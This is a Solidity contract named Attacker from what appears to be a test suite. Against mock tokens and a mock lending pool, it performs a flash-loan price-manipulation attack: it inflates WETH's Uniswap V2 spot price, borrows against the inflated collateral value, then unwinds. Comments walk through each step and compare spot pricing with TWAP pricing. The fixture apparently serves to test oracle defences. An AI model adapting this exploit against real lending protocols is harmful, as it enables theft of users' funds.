// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {MockERC20} from "../MockERC20.sol";
import {UniswapV2Router02} from "../../../src/v2-periphery/UniswapV2Router02.sol";
import {LendingMock} from "./LendingMock.sol";
import {FlashLenderMock} from "./FlashLenderMock.sol";

contract Attacker {
    MockERC20 public immutable weth;
    MockERC20 public immutable usdc;
    UniswapV2Router02 public immutable router;
    LendingMock public immutable pool;
    FlashLenderMock public immutable lender;

    uint256 public borrowed;

    constructor(UniswapV2Router02 _router, LendingMock _pool, FlashLenderMock _lender) {
        router = _router;
        pool = _pool;
        lender = _lender;
        weth = pool.weth();
        usdc = pool.usdc();
        weth.approve(address(router), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
    }

    function attack(uint256 flashAmount) external {
        lender.flashLoan(this, flashAmount);
    }

    /// @notice Uses flash-borrowed USDC to manipulate the price, borrow, and repay the flash loan.
    /// @dev Starts with 10 WETH supplied as collateral and the USDC received from the flash lender.
    /// @param amount Flash-borrowed USDC amount.
    /// @param fee Additional USDC required to repay the flash loan.
    function onFlashLoan(uint256 amount, uint256 fee) external {
        // 1. Checks the caller is the configured flash lender.
        require(msg.sender == address(lender), "Invalid lender");

        // 2. Use the flash loan to push WETH’s price up on Uniswap V2
        // This moves the price from 1,000 to approximately 3,000 USDC per WETH.
        // boughtWeth tracks the WETH purchased with the flash loan, separately from the attacker’s original 10 WETH.
        uint256 boughtWeth = _swap(amount, address(usdc), address(weth));

        // 3. Deposits the attacker’s original 10 WETH into the lending pool as collateral,
        // and borrow the maximum
        // The LendingMock allows borrowing up to 50% of the collateral’s oracle value (LTV). 
        // With spot pricing:
        // - 10 WETH × 3,000 USDC/WETH × 50% = 15,000 USDC
        // With the test’s established TWAP price:
        // - 10 WETH × 1,000 USDC/WETH × 50% = 5,000 USDC
        pool.deposit(10 ether);
        // This line calculates how much more USDC the attacker can borrow:
        // - borrowLimit(...): the maximum total debt allowed by the current collateral value.
        // - debt(...): the USDC already owed.
        // - The difference: the unused borrowing capacity.
        borrowed = pool.borrowLimit(address(this)) - pool.debt(address(this));
        pool.borrow(borrowed);

        // 4. Reverse the price manipulation
        // Sells the WETH purchased in step 2 back for USDC, 
        // bringing the spot price close to its original value.
        // The original 10 WETH stays deposited as collateral.
        _swap(boughtWeth, address(weth), address(usdc));

        // 5. Repays the flash loan plus its fee using the USDC now held by the attacker.
        usdc.transfer(address(lender), amount + fee);
    }

    function _swap(uint256 amount, address tokenIn, address tokenOut) private returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uint256[] memory quoted = router.getAmountsOut(amount, path);
        uint256[] memory amounts =
            router.swapExactTokensForTokens(amount, quoted[1], path, address(this), block.timestamp);
        return amounts[1];
    }
}
